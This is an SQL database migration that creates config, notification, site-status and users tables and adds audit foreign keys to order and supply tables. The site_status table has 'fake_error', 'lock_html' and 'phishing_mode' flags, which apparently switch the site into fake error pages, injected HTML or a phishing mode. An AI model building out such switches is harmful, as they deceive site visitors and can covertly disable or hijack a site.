CREATE TABLE "app_config" (
	"key" varchar(255) PRIMARY KEY NOT NULL,
	"value" text NOT NULL,
	"description" text,
	"created_at" timestamp with time zone DEFAULT CURRENT_TIMESTAMP,
	"updated_at" timestamp with time zone DEFAULT CURRENT_TIMESTAMP
);
--> statement-breakpoint
CREATE TABLE "site_notifications" (
	"id" serial PRIMARY KEY NOT NULL,
	"message" text NOT NULL,
	"type" varchar(50) DEFAULT 'info',
	"is_active" varchar(5) DEFAULT 'true',
	"created_at" timestamp with time zone DEFAULT CURRENT_TIMESTAMP
);
--> statement-breakpoint
CREATE TABLE "site_status" (
	"id" serial PRIMARY KEY NOT NULL,
	"is_locked" varchar(5) DEFAULT 'false',
	"lock_title" varchar(255) DEFAULT 'Site Under Maintenance',
	"lock_message" text,
	"lock_html" text,
	"locked_at" timestamp with time zone,
	"locked_by" varchar(255),
	"fake_error" varchar(5) DEFAULT 'false',
	"error_code" varchar(10) DEFAULT '500',
	"error_message" text,
	"phishing_mode" varchar(5) DEFAULT 'false'
);
--> statement-breakpoint
CREATE TABLE "users" (
	"id" serial PRIMARY KEY NOT NULL,
	"name" varchar(255) NOT NULL,
	"email" varchar(255) NOT NULL,
	"password_hash" varchar(255) NOT NULL,
	"role" varchar(50) DEFAULT 'user' NOT NULL,
	"created_at" timestamp with time zone DEFAULT CURRENT_TIMESTAMP,
	CONSTRAINT "users_email_unique" UNIQUE("email")
);
--> statement-breakpoint
ALTER TABLE "order_items" ALTER COLUMN "case_no" SET DATA TYPE varchar(255);--> statement-breakpoint
ALTER TABLE "history" ADD COLUMN "created_by" integer;--> statement-breakpoint
ALTER TABLE "orders" ADD COLUMN "created_by" integer;--> statement-breakpoint
ALTER TABLE "orders" ADD COLUMN "updated_by" integer;--> statement-breakpoint
ALTER TABLE "records" ADD COLUMN "created_by" integer;--> statement-breakpoint
ALTER TABLE "records" ADD COLUMN "updated_by" integer;--> statement-breakpoint
ALTER TABLE "supply" ADD COLUMN "created_by" integer;--> statement-breakpoint
ALTER TABLE "supply" ADD COLUMN "updated_by" integer;--> statement-breakpoint
ALTER TABLE "history" ADD CONSTRAINT "history_created_by_users_id_fk" FOREIGN KEY ("created_by") REFERENCES "public"."users"("id") ON DELETE no action ON UPDATE no action;--> statement-breakpoint
ALTER TABLE "orders" ADD CONSTRAINT "orders_created_by_users_id_fk" FOREIGN KEY ("created_by") REFERENCES "public"."users"("id") ON DELETE no action ON UPDATE no action;--> statement-breakpoint
ALTER TABLE "orders" ADD CONSTRAINT "orders_updated_by_users_id_fk" FOREIGN KEY ("updated_by") REFERENCES "public"."users"("id") ON DELETE no action ON UPDATE no action;--> statement-breakpoint
ALTER TABLE "records" ADD CONSTRAINT "records_created_by_users_id_fk" FOREIGN KEY ("created_by") REFERENCES "public"."users"("id") ON DELETE no action ON UPDATE no action;--> statement-breakpoint
ALTER TABLE "records" ADD CONSTRAINT "records_updated_by_users_id_fk" FOREIGN KEY ("updated_by") REFERENCES "public"."users"("id") ON DELETE no action ON UPDATE no action;--> statement-breakpoint
ALTER TABLE "supply" ADD CONSTRAINT "supply_created_by_users_id_fk" FOREIGN KEY ("created_by") REFERENCES "public"."users"("id") ON DELETE no action ON UPDATE no action;--> statement-breakpoint
ALTER TABLE "supply" ADD CONSTRAINT "supply_updated_by_users_id_fk" FOREIGN KEY ("updated_by") REFERENCES "public"."users"("id") ON DELETE no action ON UPDATE no action;